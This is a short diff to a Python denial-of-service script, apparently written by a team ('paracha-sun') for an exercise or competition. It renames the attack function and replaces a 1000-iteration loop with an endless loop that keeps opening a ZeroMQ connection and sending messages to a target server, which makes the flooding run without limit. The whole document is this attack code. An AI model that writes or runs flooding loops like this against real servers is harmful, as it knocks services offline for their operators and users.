@@ -3,7 +3,10 @@ from payloads import *
 import pickle
 import zmq
 
-def dos_attack():
+"""
+Team paracha-sun DOS attack
+"""
+def dos_attack_paracha_sun():
     # pid = os.fork()
     # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ctx = zmq.Context.instance()
@@ -13,9 +16,9 @@ def dos_attack():
     # s.connect(address)
     print ">> GET /" + sys.argv[2] + " HTTP/1.1"
     server_socket.send_json({"msg": "Connect"})
-    # s.close()
+    server_socket.close()
 
 
 if __name__ == '__main__':
-    for i in range(1, 1000):
-        dos_attack()
+    while True:
+        dos_attack_paracha_sun()
